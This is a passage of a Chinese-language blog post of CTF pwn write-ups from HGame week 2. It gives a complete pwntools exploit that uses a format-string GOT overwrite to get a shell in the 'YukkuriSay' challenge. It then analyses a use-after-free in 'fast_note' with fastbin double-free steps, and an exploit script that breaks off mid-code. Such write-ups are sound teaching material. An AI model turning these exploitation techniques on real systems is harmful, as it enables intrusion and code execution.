class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 自动生成头部</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> p64, p32, u32, u64, p8, p16<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br><span class="hljs-keyword">import</span> ctypes<br><br>rmt: <span class="hljs-built_in">bool</span> = <span class="hljs-literal">False</span><br>fn: <span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;./HGame-week2-YukkuriSay&quot;</span><br>libc_name: <span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;./libc-2.31.so&quot;</span><br>port: <span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;31110&quot;</span><br>if_32: <span class="hljs-built_in">bool</span> = <span class="hljs-literal">False</span><br>if_debug:<span class="hljs-built_in">bool</span> = <span class="hljs-literal">False</span><br>pg = p32 <span class="hljs-keyword">if</span> if_32 <span class="hljs-keyword">else</span> p64<br>ug = u32 <span class="hljs-keyword">if</span> if_32 <span class="hljs-keyword">else</span> u64<br>context(log_level=<span class="hljs-string">&quot;debug&quot;</span>, arch=<span class="hljs-string">&quot;i386&quot;</span> <span class="hljs-keyword">if</span> if_32 <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;amd64&quot;</span>, os=<span class="hljs-string">&quot;linux&quot;</span>)<br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;splitw&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>]<br>env = &#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>: libc_name&#125;<br><span class="hljs-comment"># 两个elf，注意libc的版本</span><br>m_elf = ELF(fn)<br>libc = ELF(libc_name)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">suclog</span>(<span class="hljs-params">*args, **kwargs</span>):<br>    <span class="hljs-comment"># args是变量名，是字符串</span><br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> args:<br>        v = <span class="hljs-built_in">globals</span>()[k]<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(v, <span class="hljs-built_in">int</span>):<br>            success(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;k&#125;</span> =&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(v)&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            success(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;k&#125;</span> =&gt; <span class="hljs-subst">&#123;v&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> kwargs.items():<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(v, <span class="hljs-built_in">int</span>):<br>            success(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;k&#125;</span> =&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(v)&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            success(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;k&#125;</span> =&gt; <span class="hljs-subst">&#123;v&#125;</span>&quot;</span>)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_after_clean</span>(<span class="hljs-params">content: <span class="hljs-built_in">bytes</span> = <span class="hljs-string">b&quot;&quot;</span>, until: <span class="hljs-built_in">bytes</span> = <span class="hljs-literal">None</span>,\</span><br><span class="hljs-params">                     timeout: <span class="hljs-built_in">float</span> = <span class="hljs-number">0.05</span>, no_show: <span class="hljs-built_in">bool</span> = <span class="hljs-literal">True</span></span>):<br>    <span class="hljs-keyword">if</span> until <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        p.recvuntil(flat(until))<br>    <span class="hljs-keyword">else</span>:<br>        received = p.clean(timeout)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> no_show:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[$]received:\n<span class="hljs-subst">&#123;received&#125;</span>&quot;</span>)<br>    p.send(flat(content))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sendline_after_clean</span>(<span class="hljs-params">content: <span class="hljs-built_in">bytes</span> = <span class="hljs-string">b&quot;&quot;</span>, until: <span class="hljs-built_in">bytes</span> = <span class="hljs-literal">None</span>,\</span><br><span class="hljs-params">                         timeout: <span class="hljs-built_in">float</span> = <span class="hljs-number">0.05</span>, no_show: <span class="hljs-built_in">bool</span> = <span class="hljs-literal">True</span></span>):<br>    send_after_clean([content, p.newline], until, timeout, no_show)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">interactive_after_clean</span>(<span class="hljs-params">timeout:<span class="hljs-built_in">int</span> = <span class="hljs-number">0.05</span>, no_show: <span class="hljs-built_in">bool</span> = <span class="hljs-literal">True</span></span>):<br>    received = p.clean(timeout)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> no_show:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[$]received:\n<span class="hljs-subst">&#123;received&#125;</span>&quot;</span>)<br>    p.interactive()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">c_val</span>(<span class="hljs-params">value: <span class="hljs-built_in">int</span>, c_type: string</span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    type_dict = &#123;<br>        <span class="hljs-string">&quot;long&quot;</span>: ctypes.c_long,<br>        <span class="hljs-string">&quot;longlong&quot;</span>: ctypes.c_longlong,<br>        <span class="hljs-string">&quot;ulong&quot;</span>: ctypes.c_ulong,<br>        <span class="hljs-string">&quot;ulonglong&quot;</span>: ctypes.c_ulonglong,<br>        <span class="hljs-string">&quot;int8&quot;</span>: ctypes.c_int8,<br>        <span class="hljs-string">&quot;int16&quot;</span>: ctypes.c_int16,<br>        <span class="hljs-string">&quot;int32&quot;</span>: ctypes.c_int32,<br>        <span class="hljs-string">&quot;int64&quot;</span>: ctypes.c_int64,<br>        <span class="hljs-string">&quot;uint8&quot;</span>: ctypes.c_uint8,<br>        <span class="hljs-string">&quot;uint16&quot;</span>: ctypes.c_uint16,<br>        <span class="hljs-string">&quot;uint32&quot;</span>: ctypes.c_uint32,<br>        <span class="hljs-string">&quot;uint64&quot;</span>: ctypes.c_uint64,<br>        <span class="hljs-string">&quot;int&quot;</span>: ctypes.c_int,<br>        <span class="hljs-string">&quot;char&quot;</span>: ctypes.c_char,<br>        <span class="hljs-string">&quot;bool&quot;</span>: ctypes.c_bool,<br>        <span class="hljs-string">&quot;float&quot;</span>: ctypes.c_float,<br>        <span class="hljs-string">&quot;double&quot;</span>: ctypes.c_double,<br>        <span class="hljs-string">&quot;ushort&quot;</span>: ctypes.c_ushort,<br>        <span class="hljs-string">&quot;byte&quot;</span>: ctypes.c_byte,<br>        <span class="hljs-string">&quot;longdouble&quot;</span>: ctypes.c_longdouble,<br>        <span class="hljs-string">&quot;size_t&quot;</span>: ctypes.c_size_t,<br>        <span class="hljs-string">&quot;ssize_t&quot;</span>: ctypes.c_ssize_t,<br>        <span class="hljs-string">&quot;ubyte&quot;</span>: ctypes.c_ubyte<br>    &#125;<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">str</span>(type_dict[c_type](value).value), encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">eval</span>(<span class="hljs-string">f&quot;ctypes.c_<span class="hljs-subst">&#123;c_type&#125;</span>(value).value&quot;</span>)), encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>)<br>        <span class="hljs-keyword">except</span>:<br>            error(<span class="hljs-string">f&quot;无法转换<span class="hljs-subst">&#123;value&#125;</span>或不存在类型<span class="hljs-subst">&#123;c_type&#125;</span>&quot;</span>)<br>        <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_libc</span>(<span class="hljs-params">libc_name: <span class="hljs-built_in">str</span>, *args, **kwargs</span>) -&gt; ctypes.CDLL:<br>    <span class="hljs-keyword">return</span> ctypes.CDLL(libc_name, args, kwargs)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">recv_and_transform</span>(<span class="hljs-params">prev_string: <span class="hljs-built_in">str</span> = <span class="hljs-literal">None</span>, from_bytes: <span class="hljs-built_in">bool</span> = <span class="hljs-literal">True</span>,\</span><br><span class="hljs-params">    is_canary: <span class="hljs-built_in">bool</span> = <span class="hljs-literal">False</span>, bound: <span class="hljs-built_in">str</span> = <span class="hljs-literal">None</span></span>) -&gt; <span class="hljs-built_in">int</span>:<br>    <span class="hljs-keyword">if</span> prev_string <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        p.recvuntil(flat(prev_string))<br>    <span class="hljs-keyword">if</span> bound <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        bound = flat(bound)<br>    <span class="hljs-keyword">if</span> from_bytes:<br>        <span class="hljs-keyword">if</span> bound <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">return</span> ug(p.recvuntil(bound)[:-<span class="hljs-built_in">len</span>(bound)].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>        <span class="hljs-keyword">if</span> if_32:<br>            <span class="hljs-keyword">return</span> ug(p.recv(<span class="hljs-number">4</span>))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">if</span> is_canary:<br>                <span class="hljs-keyword">return</span> ug(p.recv(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> ug(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">if</span> bound <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(p.recvuntil(bound)[:-<span class="hljs-built_in">len</span>(bound)], <span class="hljs-number">16</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">if</span> if_32:<br>                <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">10</span>), <span class="hljs-number">16</span>)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">if</span> is_canary:<br>                    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">18</span>), <span class="hljs-number">16</span>)<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>), <span class="hljs-number">16</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">formula_compute</span>(<span class="hljs-params">formula: <span class="hljs-built_in">bytes</span>, precise: <span class="hljs-built_in">bool</span> = <span class="hljs-literal">False</span></span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(formula, <span class="hljs-built_in">bytes</span>):<br>        formula = formula.decode(<span class="hljs-string">&quot;UTF-8&quot;</span>)<br>    formula = formula.strip()<br>    formula = formula.strip(<span class="hljs-string">&quot;\n&quot;</span>)<br>    formula = formula.replace(<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;*&quot;</span>)<br>    formula = formula.replace(<span class="hljs-string">&quot;^&quot;</span>, <span class="hljs-string">&quot;**&quot;</span>)<br>    formula = formula.replace(<span class="hljs-string">&quot;÷&quot;</span>, <span class="hljs-string">&quot;/&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> precise:<br>        formula = formula.replace(<span class="hljs-string">&quot;//&quot;</span>, <span class="hljs-string">&quot;/&quot;</span>)<br>        formula = formula.replace(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-string">&quot;//&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">eval</span>(formula)), encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>)<br>...<br><br>p =  <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>    <span class="hljs-keyword">global</span> p<br>    <span class="hljs-keyword">if</span> rmt:<br>        p = remote(<span class="hljs-string">&quot;week-2.hgame.lwsec.cn&quot;</span>, port)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">if</span> if_debug:<br>            p = gdb.debug(fn, <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">                            b* 0x4016A4</span><br><span class="hljs-string">                            c</span><br><span class="hljs-string">                            &quot;&quot;&quot;</span>, env=env)<br>        <span class="hljs-keyword">else</span>:<br>            p = process(fn, env=env)<br>    <span class="hljs-comment"># 11111111</span><br>    <span class="hljs-comment"># %8$s</span><br>    payload = flat([<br>        <span class="hljs-string">b&quot;a&quot;</span>*(<span class="hljs-number">0xe0</span>),<br>        <span class="hljs-string">b&quot;b&quot;</span>*<span class="hljs-number">8</span>,<br>    ])<br>    send_after_clean(payload)<br>    base_addr = recv_and_transform(<span class="hljs-string">b&quot;b&quot;</span>*<span class="hljs-number">8</span>) - libc.sym[<span class="hljs-string">&#x27;setbuffer&#x27;</span>] - <span class="hljs-number">204</span><br>    system_addr = base_addr + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>    one = [<span class="hljs-number">0xe3afe</span>, <span class="hljs-number">0xe3b01</span>, <span class="hljs-number">0xe3b04</span>]<br>    one_gadget = base_addr + one[<span class="hljs-number">1</span>]<br>    suclog(<br>        base_addr=base_addr,<br>        one_gadget=one_gadget,<br>        system_addr=system_addr<br>    )<br>    sendline_after_clean(<span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-string">&quot;anything else?(Y/n)\n&quot;</span>)<br>    <br>    payload = flat([<br>        <span class="hljs-string">b&quot;a&quot;</span>*(<span class="hljs-number">0xf8</span>),<br>        <span class="hljs-string">b&quot;b&quot;</span>*<span class="hljs-number">8</span>,<br>    ])<br>    send_after_clean(payload)<br>    stack_addr = recv_and_transform(<span class="hljs-string">b&quot;b&quot;</span>*<span class="hljs-number">6</span>) - <span class="hljs-number">0x8</span><br>    suclog(stack_addr=stack_addr)<br>    sendline_after_clean(<span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-string">&quot;anything else?(Y/n)\n&quot;</span>)<br>    <br>    payload = flat([<br>        m_elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>],<br>        m_elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>] + <span class="hljs-number">2</span>,<br>        m_elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>] + <span class="hljs-number">4</span>,<br>        stack_addr,<br>        stack_addr + <span class="hljs-number">2</span><br>    ])<br>    sendline_after_clean(payload)<br>    sendline_after_clean(<span class="hljs-string">&quot;n&quot;</span>, <span class="hljs-string">&quot;anything else?(Y/n)\n&quot;</span>)<br>    return_addr = <span class="hljs-number">0x401671</span><br>    write1 = system_addr &amp; <span class="hljs-number">0xffff</span><br>    write2 = ((system_addr &gt;&gt; (<span class="hljs-number">2</span>*<span class="hljs-number">8</span>)) &amp; <span class="hljs-number">0xffff</span>)<br>    write3 = ((system_addr &gt;&gt; (<span class="hljs-number">4</span>*<span class="hljs-number">8</span>)) &amp; <span class="hljs-number">0xffff</span>)<br>    ret1 = return_addr &amp; <span class="hljs-number">0xffff</span><br>    ret2 = (return_addr &gt;&gt; (<span class="hljs-number">2</span>*<span class="hljs-number">8</span>)) &amp; <span class="hljs-number">0xffff</span><br>    which_write = &#123;write1:<span class="hljs-number">8</span>, write2:<span class="hljs-number">9</span>, write3:<span class="hljs-number">10</span>, ret1: <span class="hljs-number">11</span>, ret2:<span class="hljs-number">12</span>&#125;<br>    all_write = [write1, write2, write3, ret1, ret2]<br>    all_write.sort()<br>    payload = <span class="hljs-string">&quot;&quot;</span><br>    tmp = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> to_write <span class="hljs-keyword">in</span> all_write:<br>        payload += <span class="hljs-string">f&quot;%<span class="hljs-subst">&#123;to_write-tmp&#125;</span>c%<span class="hljs-subst">&#123;which_write[to_write]&#125;</span>$hn&quot;</span><br>        tmp = to_write<br>    <span class="hljs-comment"># %43$n</span><br>    <span class="hljs-comment"># payload = f&quot;%&#123;write2&#125;c%8$hn%&#123;write1-write2&#125;c%9$hn%&#123;write3-write1&#125;c%10$hn&quot;</span><br>    sendline_after_clean(payload, <span class="hljs-string">&quot;a gift for you: \n&quot;</span>)<br>    sendline_after_clean(<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>)<br><br>pwn()<br>interactive_after_clean()<br></code></pre></td></tr></table></figure><h2 id="6-fast-note"><a href="#6-fast-note" class="headerlink" title="6.fast_note"></a>6.fast_note</h2><p><strong>glibc2.23</strong></p><h3 id="fastbin-arbitrary-alloc"><a href="#fastbin-arbitrary-alloc" class="headerlink" title="fastbin arbitrary alloc"></a>fastbin arbitrary alloc</h3><p>利用UAF漏洞，形成一个double free</p><p>在目标target附近寻找一个可用的fake_chunk</p><ul><li>size大小为0x70 - 0x7F之间（有利于用错字节找到fake_chunk）</li><li>fake_chunk的内容部分必须包含target的地址（在填充fake_chunk内容的同时修改target）</li></ul><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p><strong>菜单题，fastbin attack</strong></p><p>在free的时候，存在UAF漏洞</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">delete_note</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+4h] [rbp-Ch] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Index: &quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%u&quot;</span>, &amp;v1);<br>  <span class="hljs-keyword">if</span> ( v1 &lt;= <span class="hljs-number">0xF</span> )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( (&amp;notes)[v1] )<br>      <span class="hljs-built_in">free</span>((&amp;notes)[v1]);<br>    <span class="hljs-keyword">else</span><br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Page not found.&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;There are only 16 pages in this notebook.&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v2;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p><strong>第一种：fastbin arbitrary alloc</strong></p><ol><li><p>构造出一个unsorted bin，泄露fd上的值</p></li><li><p>libc: 获取main_arena+88的地址，<code>main_arena</code>和<code>__malloc_hook</code>差0x10字节</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">main_arena = u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)) - <span class="hljs-number">88</span> - <span class="hljs-number">0x10</span><br>libc_base = main_arena - libc.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br></code></pre></td></tr></table></figure></li><li><p>利用UAF，实现double free</p></li><li><p>定位到目标地址处，找到一个类heap的地址addr（addr+0x8处存在一个size位）</p></li><li><p>技巧Arbitrary Alloc，填充，改free函数的got表地址</p></li></ol><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>banary = <span class="hljs-string">&quot;./vuln&quot;</span><br>elf = ELF(banary)<br>ip = <span class="hljs-string">&#x27;1&#x27;</span><br>port = <span class="hljs-number">1</span><br><br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span>(local==<span class="hljs-number">1</span>):<br>p = process(banary)<br><span class="hljs-keyword">else</span>:<br>p = remote(ip, port)<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>gdb.attach(p)<br>pause()<br><br>s = <span class="hljs-keyword">lambda</span> data : p.send(data)<br>sl = <span class="hljs-keyword">lambda</span> data : p.sendline(data)<br>sa = <span class="hljs-keyword">lambda</span> text, data : p.sendafter(text, data)<br>sla = <span class="hljs-keyword">lambda</span> text, data : p.sendlineafter(text, data)<br>r = <span class="hljs-keyword">lambda</span> : p.recv()<br>ru = <span class="hljs-keyword">lambda</span> text : p.recvuntil(text)<br>uu32 = <span class="hljs-keyword">lambda</span> : u32(p.recvuntil(<span class="hljs-string">b&quot;\xff&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>uu64 = <span class="hljs-keyword">lambda</span> : u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>lg = <span class="hljs-keyword">lambda</span> s : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m %s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br>pi = <span class="hljs-keyword">lambda</span> : p.interactive()<br><span class="hljs-comment">#------------------------   ----------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">choice</span>):<br>ru(<span class="hljs-string">&#x27;&gt;&#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(choice))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size,con=p64(<span class="hljs-params"><span class="hljs-number">0xdeadbeef</span></span>)</span>):<br>menu(<span class="hljs-number">1</span>)<br>ru(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(index))<br>ru(<span class="hljs-string">&#x27;Size: &#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(size))<br>ru(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br>s(con)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>menu(<span class="hljs-number">2</span>)<br>ru(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>sl(<span 